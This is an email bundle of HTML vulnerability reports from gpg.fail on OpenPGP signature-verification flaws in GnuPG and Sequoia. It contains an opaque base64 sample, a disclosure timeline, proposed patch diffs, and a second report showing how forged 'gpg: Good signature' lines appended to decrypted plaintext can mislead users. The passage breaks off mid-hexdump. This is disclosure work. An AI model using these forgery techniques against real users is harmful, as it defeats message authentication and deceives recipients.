<span class=3D"line"><span>roXJMLQZapEGMIVckkrStXoiuzjDtpJa+VuqJcOD4NWo1/X8=
6Yc7rIPHa2xzw9NLqi73HzhqISnt</span></span>
<span class=3D"line"><span>dUmDSHTnONV5vwm8a0uAyu5egAFAfKu/W00SQXbCmKN3Dpip=
fyoopt/WP2oJXItKRTkXGclCG8Mj</span></span>
<span class=3D"line"><span>4152xBKbHbnHX47Rgz+iUZr6HBEXaQpD1SKFQyYghAzf16di=
iY08R9dS4C+ygqcXGoJaWVnac7C0</span></span>
<span class=3D"line"><span>X2lJBKhYU4VuVEXPj57/nru30IYtqpLaHaBMzzxfZMa2ca8U=
e2RYq966XN4iZBsyyyZLLzyMoH3t</span></span>
<span class=3D"line"><span>vd1thnn+wtcd5fMLnNVJLOOs2Qiklg14y/BEmpiCExRgqVJ3=
B7h/XWcUIh3t34F0rHTIKFQq8SSD</span></span>
<span class=3D"line"><span>GYWtymfr5PgIqYFSt9HfxF1q7CisUu8hsJBcZf69HKgtQIzK=
KOVn5LAEE/W/ulYEoYeK7p6xYAl9</span></span>
<span class=3D"line"><span>9isMCBQTl6r09OLPKlAaBm0iKpMc3uhTAEGgnSjSaXRIRYeq=
PzD5dSj/iFZCRs7yVT17o7qQ4q/v</span></span>
<span class=3D"line"><span>B3FDiYMRrW1xR+O5kpLH28MmOuOq7cj6qMvc/m/W1W4sj6ox=
oNLj2xSv/bAEpJ1R7KlymlUfVI3Y</span></span>
<span class=3D"line"><span>ftwiz46oXx7mTElE+dEqw7XF80Cu6USeUUnykKfJc48QU/0o=
LiTM4ptwf6ic3cIrvTD3Y+67SBcq</span></span>
<span class=3D"line"><span>ZxALxJPIgU4DOkrdXutYfZqrJczZeXSCMHWybUKuwruOhW9P=
gCosmuFugyRmB0NkHa5LmXzozWPY</span></span>
<span class=3D"line"><span>IRddzJUJp4SP+WNwYwjrf20cZkJ1QdjNIf82DjHmNC0yZ5sT=
Jh1nAVPWfgbChE6kpZG1tFM8HlLC</span></span>
<span class=3D"line"><span>EBH+pIS2qNqHm53mdah+vC3F9LE21OCo8rvd4EU+5jMLY8+c=
zp8GBDvP5TectR3zLQWmZfqgO+AF</span></span>
<span class=3D"line"><span>+4+Vzhcetojnmzlw35DSEfugkas1XQAhY/w7oliS96r/dRp7=
3vJkbAnkNFmx3dvU2tEBc8g4uvzL</span></span>
<span class=3D"line"><span>C1YNBRz9SNWd/9YTlyQ9KLt4iLntkJY1+R4ohVVxREzvLeKC=
4L9in6NgAqOmHwT10pbFJ9k8xet2</span></span>
<span class=3D"line"><span>mZ/tP0L8ircaCK84XEpxa/02yhrW/6xCWFOf5JVhUcMT/eL1=
HtUI2wYBSMtERhfI08RmxtsOTm54</span></span>
<span class=3D"line"><span>3zArerUUzVkKmnVkQpyLy3NOVSFJI83rY9Z2a54VJB6+lz9C=
xcl4lKTcqPT+X8kLU3XXbfqrri89</span></span>
<span class=3D"line"><span>N7Hftac1K1h0b31kC3HU8kxL0yIEPIHzuqDFIC/d38xDSCf+=
q+dnyVzXlNOnJa9P7S6PQHfr75TQ</span></span>
<span class=3D"line"><span>xhGnd2gpA1HlPS/DzHmhB0w99pxwH5oPuGJovP8YgPvdvMUN=
v9Hoae1oOybZ5n7SRG+bRMb0hn0x</span></span>
<span class=3D"line"><span>2z/AcKke196S2Gdqi//U45YCBmZ4svO0m+yuRaKqog7hahhQ=
/MvkYxvqQH6h7YO/ZHMNSoEAKI3N</span></span>
<span class=3D"line"><span>PZ76zT6vozBBaelqyJMtKjxIPbOVsrfM4sS8Y01L4ZAdMPc0=
LPj+YzCa6ClEWzdF6TFokiRXb9J2</span></span>
<span class=3D"line"><span>o8FNso38P9DADSegTnKFX0BjbNTIvWXuhgi9cITZR1rbNmGq=
n/nlJrxhkjeL+jxXOe1TPl7ZcAZp</span></span>
<span class=3D"line"><span>f21K0TsU6tKZ9kYu5kWGcnrOeR3SAoOJz0CWmIVh55YLiBSN=
6H5X8RAxs7jZi/3mcT4agizop4hn</span></span>
<span class=3D"line"><span>vqO2OqJVvExEQ4jP++Jna/qwZGGe0UmYNEeDPrWZ5vkwwMSi=
1kyVFVzpADj/vBo7OrVxiSiyqkox</span></span>
<span class=3D"line"><span>H6WZToWoruwpo4s8KDoOXuB/CXnDpdPxEbruIg6qcrGLc9GE=
UKLCTgCdBaZAniwYRdyoaAJC9KXB</span></span>
<span class=3D"line"><span>uhyCuLQdkFZrLCmhCrhDGIsb4sdwRdKkmsfalVhVbdjQu3cC=
nYQhBNuOk0CftA2j2zydz0brme7d</span></span>
<span class=3D"line"><span>htdaO8oFqdJHQL2/KEAkEXGz0/k1HK8uibYuwW288yyQWF8z=
y0DqB8XuGCmckOocOZd1OZEwymOW</span></span>
<span class=3D"line"><span>oSgvf2Dx0pMwN9Xaj8+Wx8RXyvHSMeSPN3x6hM/LQiTnLHsu=
UUE8R6W6kb2ihXZKFIH/JUCh2eOP</span></span>
<span class=3D"line"><span>SFJNrD8CzPfhQ6L9Ed28av37rP91EXNbu0COlLI0W1GEd2zm=
sGwpsvWKZfeTPI4dqqp28UkDBzk+</span></span>
<span class=3D"line"><span>2WQUZDJfMQ1TOD1mBHm9ZAL13VsegqDkgFbhsQsmbihpMUkv=
YxPjQKYxW1kzC+9qLP8BsX5grSft</span></span>
<span class=3D"line"><span>6qWUEl9dQTlXSsTKsVccHK59alf/am3m6xM7Hcw3UgpofH1+=
PidgTjMK2lCG3blXhWe4zGuQnzzg</span></span>
<span class=3D"line"><span>i0/nfX6cDdNxSXHdAX3JUpb1G9WLn8qWSJodKkEAPtGHYo6v=
utlovxP7PBLTldM106YTIVrudasl</span></span>
<span class=3D"line"><span>3EuF8xxKkcXTcJeBTf+Dr+11seDqP79e++xIKaaFvmwqQ9BM=
XII194cmyDQ9VC4iI5j0mHncXRfr</span></span>
<span class=3D"line"><span>G/lUxTJ7ppLqYqCVRICwfdOl72SMoDv/33et8EA/mC36x54s=
OAIUzO8zHlmW9fx3vwq2Xb+9bPh3</span></span>
<span class=3D"line"><span>tqPlzDGB0PGkoF9Aau7IWCPvGDK9rr+gw7MFcBoPxzH/AyWx=
e680rmcWAIEgrHDtq/9sAkms1lVm</span></span>
<span class=3D"line"><span>a2SzW4nrrQo/HikWKHOZTrspvHBQdXf2eqsTg0ZStSOHYHNb=
eKA+ib2W/eHS7bJ0mMWgy5/U2Ngd</span></span>
<span class=3D"line"><span>Bjbm+m3JGLLIvpBYuGuP5QPI1N08uX88FBxkYRC2fGm9cZDD=
/Q7DGlig/lvmsr3cxA+kXLR2ucwW</span></span>
<span class=3D"line"><span>oZPHB+ZxHxutI5JI6gcp0ia8xRj1IYzCXhGGPy54WJN+7OIO=
f6cdhU/QV6BhyJQr07DltVB4TYIa</span></span>
<span class=3D"line"><span>B5Uc0PzbL/A4AQTjHl5zXJtQE6Btq+H5zzOfXggYMQ3oHcpH=
9D7Ai1Wh6bUnd6/1Ytv8BSPSZ1x8</span></span>
<span class=3D"line"><span>DZZc0XgsFrI+UlCh/uDUT48oUKgbjs1bYRK6FS8ZHCYEe0+U=
fWBII6Tg9DIQpglbFd4pLW7Zmq9P</span></span>
<span class=3D"line"><span>bLxotnoH1zgwljBBCC48vPoNVmeIxN2sbJdpyRdBnNUSW0Ll=
TI8V+Z+Z2dsVggyQvLGZIzJ/N61x</span></span>
<span class=3D"line"><span>caowQPLaciQypBWLyiUgf4XxZtE+9NOE8hJ9zERejXbP7sS3=
RfmtlWlAT3maD6sg7U0+yIvNtLUG</span></span>
<span class=3D"line"><span>3UigRcxcy8PdOYawEMWWohb79SS4+acLDPdBTr8pJ89YGw0n=
X3QFxOSktmIaZ7FejP0/YeZVpg5Z</span></span>
<span class=3D"line"><span>K1XejPnjkgMUxvkaSPJqW6+W32YRyX/M8rnUgHOlU7359LZu=
NaUdkwN99OrP7nPNRoPv2YCXeZtv</span></span>
<span class=3D"line"><span>KMTO92Pzr8XMWRGc95GV9U5Mr0UVdO3f+zRXJxS3B4QZfweY=
fnfL2JbyILPQy0helQRhBE0wvmhx</span></span>
<span class=3D"line"><span>dZ8nnpP8OZBiYt7oEgHgOnBJ9ZfxUX9/AEkH5dgUGrAMMMF2=
Egg9GI7WOMdPTlZv53bRJWxIATo7</span></span>
<span class=3D"line"><span>3r3THZBvVxCGYgh67oG6A2ozJl+CMgt4LIrsO68owkWy3f4g=
bpr7vyANg4+erz4AA5OMQ/XmPFcn</span></span>
<span class=3D"line"><span>lWXoGaWB3w4FFzooLFvlPNpptHF0soqV/JKtQrEwMIUIl8VP=
nXkVNgrbkO6RlYHZLBLlhYJlXouG</span></span>
<span class=3D"line"><span>dVbvDDUGlGRghUrrZPIlMSd21ndx7SflD0D4VotEtNNjGYx2=
v/900fFz0IdT9shxBthBDKlDy84c</span></span>
<span class=3D"line"><span>s4ogH1ZzBcZuhKeibO5e9fZYLroIDRv4pyuzO1pwos/AZlpw=
g01dwxWp06wqsb65P+HFbLxN+nI3</span></span>
<span class=3D"line"><span>TnntkhJg2ay1R35Ywh0hG9bd2z0OUGGI6Z3gvn5nrFNiS8n4=
hdzdocXT7p5VoXHGCdrzQzv1y/Wu</span></span>
<span class=3D"line"><span>5yBFvE5WBqsUmwbzgboRaTJEAziXNu+PfFNWIYhuORVAQNjB=
JaqyW0QkPDEzuKGA7RZwMGs5vs5g</span></span>
<span class=3D"line"><span>FJCRZsh2UVa5WnKbRMdGQjWPQ1JXW+fHV0Lyo6NTgqL9ecRi=
qAAAAPgyEHPOYVHPAAH3M4CUAwD+</span></span>
<span class=3D"line"><span>yi0RscRn+wIAAAAABFla</span></span></code></pre><=
!----> <hr/> <p>Disclosure Timeline:</p> <ul><li>21.10.2025: Submission of =
initial version of this report.</li></ul> <p>Upcoming Timeline:</p> <ul><li=
>24.10.2025: Submission of a talk for 39th Chaos Communication Congress (39=
C3). No technical details shared.</li> <li>21.12.2025: Disclosure of this r=
eport on <a href=3D"https://seclists.org/fulldisclosure/" rel=3D"nofollow">=
https://seclists.org/fulldisclosure/</a></li> <li>26-31.12.2025: If accepte=
d by content team, 39C3 Congress talk regarding this report</li></ul> <p>Pl=
ease note: While we might be able to offer some flexibility, our plan is to=
 adhere to the above stated upcoming timeline, regardless of the availabili=
ty of patches or fixes.</p> <p>We kindly request allocation of a CVE number=
 to track this issue. Please keep us updated regarding your remediation eff=
orts.</p> <p>Thank you</p> <p>Best,
Liam</p> <hr/> <h1>Recommended patches</h1> <p>Shared:</p> <ol><li>Phasing =
out cleartext signatures completely is suggested. This requires a new OpenP=
GP standard version, and a deprecation period. <em>Not possible until discl=
osure deadline</em></li></ol> <p>For GPG:
2. Only verify cleartext signatures if an explicit cleartext verification o=
ption is provided. Prevents confusion of signature format. Verification cou=
ld fail if an expected cleartext signature is malformed.
3. Always output the data that was actually verified, at least for Cleartex=
t signatures and One-Pass signatures. Might be problematic because of binar=
y output and output limits.</p> <ol><li>Alternatively, output a warning if =
output option is not used.</li></ol> <p>For Sequoia:
2. Only verify the signature type as specified in command line. User asks f=
or cleartext -> give them cleartext or nothing.</p> <h2>GPG Option 2</h2> <=
p>Introduce a new command for verification of cleartext signatures. Accept =
cleartext signatures only if this command was used. In case no command is p=
rovided, the verified data is implicitly printed. Cleartext signatures can =
be accepted in this case because tampering should be visible in the output.=
 Optionally, signature type detection could include cleartext signatures if=
 an output option was specified.</p> <p>Separating cleartext signatures int=
o a separate command for verification makes deprecating of this message typ=
e easier.</p> <h2>GPG Option 3</h2> <p>A default output file for verificati=
on can be set here. STDOUT/STDERR might be dangerous due to binary output, =
other files are likely a bad default.
This should be paired with asking users before printing binary output, skip=
ping binary output or printing as hexadecimal.</p> <!----><pre class=3D"shi=
ki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" ta=
bindex=3D"0"><code><span class=3D"line"><span style=3D"color:#79C0FF">diff =
--git a/g10/gpg.c b/g10/gpg.c</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">index 99fe5b844..5f80c93=
e7 100644</span></span>
<span class=3D"line"><span style=3D"color:#FFA198">--- a/g10/gpg.c</span></=
span>
<span class=3D"line"><span style=3D"color:#7EE787">+++ b/g10/gpg.c</span></=
span>
<span class=3D"line"><span style=3D"color:#D2A8FF;font-weight:bold">@@ -469=
8,6 +4698,8 @@</span><span style=3D"color:#E6EDF3"> main (int argc, char **=
argv)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        break;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3"> </span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">       case aVerify:</sp=
an></span>
<span class=3D"line"><span style=3D"color:#7EE787">+  if (!opt.outfile)</sp=
an></span>
<span class=3D"line"><span style=3D"color:#7EE787">+    opt.outfile =3D "-"=
;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        if (multifile)</=
span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">          &#123;</span><=
/span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            if ((rc =3D =
verify_files (ctrl, argc, argv)))</span></span></code></pre><!----> <h2>GPG=
 Option 3.1</h2> <p>Inform the user once about the dangers of verifying sig=
natures without checking what was verified. Does not output a warning if an=
 output was explicitly defined or was activated implicitly because no comma=
nd was given.</p> <!----><pre class=3D"shiki github-dark-default" style=3D"=
background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D=
"line"><span style=3D"color:#79C0FF">diff --git a/g10/mainproc.c b/g10/main=
proc.c</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">index 8108a07b7..b73580f=
13 100644</span></span>
<span class=3D"line"><span style=3D"color:#FFA198">--- a/g10/mainproc.c</sp=
an></span>
<span class=3D"line"><span style=3D"color:#7EE787">+++ b/g10/mainproc.c</sp=
an></span>
<span class=3D"line"><span style=3D"color:#D2A8FF;font-weight:bold">@@ -234=
,6 +234,13 @@</span><span style=3D"color:#E6EDF3"> add_signature (CTX c, PA=
CKET *pkt)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3"> &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">   kbnode_t node;</span>=
</span>
<span class=3D"line"><span style=3D"color:#E6EDF3"> </span></span>
<span class=3D"line"><span style=3D"color:#7EE787">+  if (!c->any.sig_seen =
&#x26;&#x26; !c->signed_data.used</span></span>
<span class=3D"line"><span style=3D"color:#7EE787">+      &#x26;&#x26; !(op=
t.outfp || opt.outfile || !c->sigs_only))</span></span>
<span class=3D"line"><span style=3D"color:#7EE787">+    &#123;</span></span>
<span class=3D"line"><span style=3D"color:#7EE787">+      log_error ("WARNI=
NG: Verified data might differ from assumed input,&#92;n");</span></span>
<span class=3D"line"><span style=3D"color:#7EE787">+      log_error ("use -=
-output to validate actual signed data.");</span></span>
<span class=3D"line"><span style=3D"color:#7EE787">+    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#7EE787">+</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">   c->any.sig_seen =3D 1=
;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">   if (pkt->pkttype =3D=
=3D PKT_SIGNATURE &#x26;&#x26; !c->list)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">     &#123;</span></span=
></code></pre><!----> <h2>Sequoia Verification Recommendations</h2> <p>Docu=
mentation, CLI and man page document separate verification options. However=
, the (inline) message verification and cleartext verification are passed t=
o the same handler internally.</p> <p>There should be separate builders and=
 verifiers for both types as this behaviour is security relevant. Also, it =
is what users would expect from the man page. Only the documentation declar=
es that sequoia tries to verify despity the type provided by the user.</p><=
!----></article><!----><!----></main> <footer class=3D"bg-blue-500 p-4">con=
tact: <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-c=
femail=3D"a2c1cdccd6c3c1d6e2c5d2c58cc4c3cbce">[email&#160;protected]</a></f=
ooter><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasync=3D"fals=
e" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js">=
</script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="09-noverify.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>GnuPG Output Fails To Distinguish Signature Verification Success From Mess=
age Content</h1> <!----><p>An implementation flaw in how GnuPG handles encr=
ypted messages allows an attacker to append arbitrary plaintext that looks =
like GnuPG log output. Because verification cannot occur without decryption=
, users cannot easily tell whether an encrypted message was signed or not.<=
/p> <h2>Impact</h2> <p>Users cannot reliably verify the authenticity of enc=
rypted messages without decrypting them to plaintext. This makes it possibl=
e for attackers to create deceptive messages that appear valid even when un=
signed.</p> <h2>Details</h2> <p>Verifying the signatures fails in both case=
s</p> <!----><pre class=3D"shiki github-dark-default" style=3D"background-c=
olor:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span=
 style=3D"color:#FFA657">$</span><span style=3D"color:#A5D6FF"> gpg</span><=
span style=3D"color:#79C0FF"> --verify</span><span style=3D"color:#A5D6FF">=
 a</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> verify</span><span style=3D"color:#A5D6FF"> signatures<=
/span><span style=3D"color:#A5D6FF"> failed:</span><span style=3D"color:#A5=
D6FF"> Unexpected</span><span style=3D"color:#A5D6FF"> error</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --verify</span><spa=
n style=3D"color:#A5D6FF"> b</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> verify</span><span style=3D"color:#A5D6FF"> signatures<=
/span><span style=3D"color:#A5D6FF"> failed:</span><span style=3D"color:#A5=
D6FF"> Unexpected</span><span style=3D"color:#A5D6FF"> error</span></span><=
/code></pre><!----> <p>Decrypting them, however, reveals plaintext output a=
nd valid signature information:</p> <!----><pre class=3D"shiki github-dark-=
default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><c=
ode><span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=
=3D"color:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --decrypt</spa=
n><span style=3D"color:#A5D6FF"> a</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> AES256.CFB</span><span style=3D"color:#A5D6FF"> encrypt=
ed</span><span style=3D"color:#A5D6FF"> data</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> encrypted</span><span style=3D"color:#A5D6FF"> with</sp=
an><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#A5D6FF"> pa=
ssphrase</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">abc</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Signature</span><span style=3D"color:#A5D6FF"> made</sp=
an><span style=3D"color:#A5D6FF"> Thu</span><span style=3D"color:#79C0FF"> =
28</span><span style=3D"color:#A5D6FF"> Aug</span><span style=3D"color:#79C=
0FF"> 2025</span><span style=3D"color:#A5D6FF"> 02:40:32</span><span style=
=3D"color:#A5D6FF"> PM</span><span style=3D"color:#A5D6FF"> CEST</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF">                using</span><span style=3D"color:#A5D6FF=
"> RSA</span><span style=3D"color:#A5D6FF"> key</span><span style=3D"color:=
#A5D6FF"> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Good</span><span style=3D"color:#A5D6FF"> signature</sp=
an><span style=3D"color:#A5D6FF"> from</span><span style=3D"color:#A5D6FF">=
 "AAAAAAAA &#x3C;<a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_emai=
l__" data-cfemail=3D"3d7c7c7c7c7d7c7c7c7c7c135e5250">[email&#160;protected]=
</a>>"</span><span style=3D"color:#E6EDF3"> [ultimate]</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --decrypt</span><sp=
an style=3D"color:#A5D6FF"> b</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> AES256.CFB</span><span style=3D"color:#A5D6FF"> encrypt=
ed</span><span style=3D"color:#A5D6FF"> data</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> encrypted</span><span style=3D"color:#A5D6FF"> with</sp=
an><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#A5D6FF"> pa=
ssphrase</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">abc</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Signature</span><span style=3D"color:#A5D6FF"> made</sp=
an><span style=3D"color:#A5D6FF"> Thu</span><span style=3D"color:#79C0FF"> =
28</span><span style=3D"color:#A5D6FF"> Aug</span><span style=3D"color:#79C=
0FF"> 2025</span><span style=3D"color:#A5D6FF"> 02:40:32</span><span style=
=3D"color:#A5D6FF"> PM</span><span style=3D"color:#A5D6FF"> CEST</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF">                using</span><span style=3D"color:#A5D6FF=
"> RSA</span><span style=3D"color:#A5D6FF"> key</span><span style=3D"color:=
#A5D6FF"> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Good</span><span style=3D"color:#A5D6FF"> signature</sp=
an><span style=3D"color:#A5D6FF"> from</span><span style=3D"color:#A5D6FF">=
 "AAAAAAAA &#x3C;<a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_emai=
l__" data-cfemail=3D"46070707070607070707076825292b">[email&#160;protected]=
</a>>"</span><span style=3D"color:#E6EDF3"> [ultimate]</span></span></code>=
</pre><!----> <p>In both cases, GnuPG reports a valid signature, but only a=
fter decryption=E2=80=94preventing safe pre-verification of message authent=
icity.</p> <h2>Scenario</h2> <p>Bob expects a signed and encrypted message =
from Alice. Mallory, an active MITM lacking Alice=E2=80=99s keys, crafts a =
fake encrypted message containing arbitrary data that mimics GnuPG=E2=80=99=
s output format.</p> <p>When Bob runs <code>gpg --verify</code>, the verifi=
cation fails.<br/> When he tries <code>gpg --decrypt</code>, it succeeds an=
d prints a =E2=80=9CGood signature=E2=80=9D message=E2=80=94despite the app=
ended plaintext being maliciously crafted. Bob, seeing a successful decrypt=
ion and valid-looking signature message, assumes authenticity.</p> <h2>Proc=
edure</h2> <p>Both <code>--verify</code> and <code>--decrypt</code> command=
s exit with code <code>0</code>.<br/> One message includes a genuine signat=
ure, the other forges GnuPG-style =E2=80=9Cgpg:=E2=80=9D lines in the plain=
text.</p> <h3>Legitimate plaintext</h3> <!----><pre class=3D"shiki github-d=
ark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0=
"><code><span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --decrypt</span><sp=
an style=3D"color:#A5D6FF"> a</span><span style=3D"color:#FF7B72"> |</span>=
<span style=3D"color:#FFA657"> hexdump</span><span style=3D"color:#79C0FF">=
 -C</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> AES256.CFB</span><span style=3D"color:#A5D6FF"> encrypt=
ed</span><span style=3D"color:#A5D6FF"> data</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> encrypted</span><span style=3D"color:#A5D6FF"> with</sp=
an><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#A5D6FF"> pa=
ssphrase</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Signature</span><span style=3D"color:#A5D6FF"> made</sp=
an><span style=3D"color:#A5D6FF"> Thu</span><span style=3D"color:#79C0FF"> =
28</span><span style=3D"color:#A5D6FF"> Aug</span><span style=3D"color:#79C=
0FF"> 2025</span><span style=3D"color:#A5D6FF"> 02:40:32</span><span style=
=3D"color:#A5D6FF"> PM</span><span style=3D"color:#A5D6FF"> CEST</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF">                using</span><span style=3D"color:#A5D6FF=
"> RSA</span><span style=3D"color:#A5D6FF"> key</span><span style=3D"color:=
#A5D6FF"> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Good</span><span style=3D"color:#A5D6FF"> signature</sp=
an><span style=3D"color:#A5D6FF"> from</span><span style=3D"color:#A5D6FF">=
 "AAAAAAAA &#x3C;<a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_emai=
l__" data-cfemail=3D"f7b6b6b6b6b7b6b6b6b6b6d994989a">[email&#160;protected]=
</a>>"</span><span style=3D"color:#E6EDF3"> [ultimate]</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000000</span><span sty=
le=3D"color:#79C0FF">  61</span><span style=3D"color:#79C0FF"> 62</span><sp=
an style=3D"color:#79C0FF"> 63</span><span style=3D"color:#A5D6FF"> 0a</spa=
n><span style=3D"color:#FF7B72">                                       |</s=
pan><span style=3D"color:#FFA657">abc.</span><span style=3D"color:#FF7B72">=
|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000004</span></span></=
code></pre><!----> <h3>Appended Plaintext</h3> <!----><pre class=3D"shiki g=
ithub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabind=
ex=3D"0"><code><span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --decrypt</span><sp=
an style=3D"color:#A5D6FF"> b</span><span style=3D"color:#FF7B72"> |</span>=
<span style=3D"color:#FFA657"> hexdump</span><span style=3D"color:#79C0FF">=
 -C</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> AES256.CFB</span><span style=3D"color:#A5D6FF"> encrypt=
ed</span><span style=3D"color:#A5D6FF"> data</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> encrypted</span><span style=3D"color:#A5D6FF"> with</sp=
an><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#A5D6FF"> pa=
ssphrase</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000000</span><span sty=
le=3D"color:#79C0FF">  61</span><span style=3D"color:#79C0FF"> 62</span><sp=
an style=3D"color:#79C0FF"> 63</span><span style=3D"color:#A5D6FF"> 0a</spa=
n><span style=3D"color:#79C0FF"> 67</span><span style=3D"color:#79C0FF"> 70=
</span><span style=3D"color:#79C0FF"> 67</span><span style=3D"color:#A5D6FF=
"> 3a</span><span style=3D"color:#79C0FF">  20</span><span style=3D"color:#=
79C0FF"> 53</span><span style=3D"color:#79C0FF"> 69</span><span style=3D"co=
lor:#79C0FF"> 67</span><span style=3D"color:#A5D6FF"> 6e</span><span style=
=3D"color:#79C0FF"> 61</span><span style=3D"color:#79C0FF"> 74</span><span =
style=3D"color:#79C0FF"> 75</span><span style=3D"color:#FF7B72">  |</span><=
span style=3D"color:#FFA657">abc.gpg:</span><span style=3D"color:#A5D6FF"> =
Signatu</span><span style=3D"color:#FF7B72">|</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">00000010</span><span sty=
le=3D"color:#79C0FF">  72</span><span style=3D"color:#79C0FF"> 65</span><sp=
an style=3D"color:#79C0FF"> 20</span><span style=3D"color:#A5D6FF"> 6d</spa=
n><span style=3D"color:#79C0FF"> 61</span><span style=3D"color:#79C0FF"> 64=
</span><span style=3D"color:#79C0FF"> 65</span><span style=3D"color:#79C0FF=
"> 20</span><span style=3D"color:#79C0FF">  54</span><span style=3D"color:#=
79C0FF"> 68</span><span style=3D"color:#79C0FF"> 75</span><span style=3D"co=
lor:#79C0FF"> 20</span><span style=3D"color:#79C0FF"> 32</span><span style=
=3D"color:#79C0FF"> 38</span><span style=3D"color:#79C0FF"> 20</span><span =
style=3D"color:#79C0FF"> 41</span><span style=3D"color:#FF7B72">  |</span><=
